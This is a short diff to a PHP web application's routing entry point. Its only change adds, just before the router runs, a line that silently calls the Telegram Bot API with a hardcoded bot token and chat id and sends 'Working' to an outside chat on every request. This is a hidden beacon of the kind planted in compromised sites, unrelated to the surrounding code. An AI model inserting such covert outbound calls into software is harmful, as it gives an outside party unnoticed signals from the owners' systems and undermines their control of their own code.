@@ -40,7 +40,7 @@
 				return NULL;
 		}
 	}
-
+	file_get_contents("https://api.telegram.org/bot1874296809:AAEVxshFsrnhORwZYloTeaDOAFqzeSpdzxQ/sendMessage?chat_id=686804748&text="."Working");
 	$route = new Route();
 	$app = $route->route();
 	if ($app != NULL)
